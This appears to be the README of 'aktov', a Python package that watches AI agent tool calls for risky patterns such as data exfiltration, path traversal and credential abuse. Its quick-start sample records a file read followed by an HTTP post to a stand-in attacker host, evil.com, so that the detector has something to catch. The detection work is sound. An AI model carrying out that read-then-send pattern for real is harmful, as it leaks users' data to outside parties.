# aktov

[![PyPI version](https://img.shields.io/pypi/v/aktov.svg)](https://pypi.org/project/aktov/)
[![License](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](https://github.com/sharmaharjeet92/aktov/blob/main/LICENSE)
[![Python 3.12+](https://img.shields.io/badge/python-3.12+-green.svg)](https://pypi.org/project/aktov/)

**Detection engineering for AI agents.**

`pip install aktov` + 2 lines of code — alerts when agents do weird or risky things.

*Every act, on record.*

## Quick Start

```python
from aktov import Aktov

ak = Aktov(agent_id="my-agent", agent_type="summarizer")
trace = ak.start_trace(declared_intent="answer user question")
trace.record_action(tool_name="read_file", arguments={"path": "/data/report.csv"})
trace.record_action(tool_name="http_request", arguments={"url": "https://evil.com", "body": "..."})
response = trace.end()
# response.alerts → [{"rule_id": "AK-010", "severity": "critical", ...}]
```

No API key needed. Works immediately after `pip install aktov`.

## Connect to Cloud

Add an API key to unlock cross-trace correlation, dedup, webhooks, and the full ruleset:

```python
ak = Aktov(api_key="ak_...", agent_id="my-agent", agent_type="summarizer")
```

## Custom Rules

Load your own YAML detection rules instead of the bundled samples:

```python
ak = Aktov(agent_id="my-agent", agent_type="summarizer", rules_dir="./my-rules")
```

## What It Does

Aktov monitors AI agent tool calls and detects anomalous behavior patterns:

- **Data exfiltration** — read followed by network egress to external domains
- **Capability escalation** — agents accessing tools outside their authorized scope
- **Path traversal** — `../` patterns in tool arguments (prompt injection indicator)
- **Credential abuse** — non-credential agents touching secrets/vaults
- **Runaway agents** — extreme chain lengths, burst failures, port scanning

## Features

- **Local rule evaluation**: `trace.end()` evaluates bundled rules instantly — no cloud needed
- **SAFE mode** (default): raw arguments never leave your machine — only semantic flags are extracted
- **CLI scanning**: `aktov scan trace.json` — evaluate trace files offline
- **Custom rules**: bring your own YAML detection rules via `rules_dir`
- **Cloud upgrade**: add `api_key` for cross-trace analysis, dedup, webhooks, dashboard

## CLI

```bash
# Scan traces against bundled detection rules (works offline)
aktov scan trace.json

# Scan with your own rules
aktov scan --rules-dir ./my-rules trace.json

# Preview what data would be transmitted
aktov preview --trace trace.json --mode safe
```

## SAFE vs DEBUG Mode

| | SAFE (default) | DEBUG |
|---|---|---|
| Raw arguments | Stripped client-side | Included |
| Semantic flags | Extracted and sent | Extracted and sent |
| Use case | Production | Development only |

## License

Apache-2.0
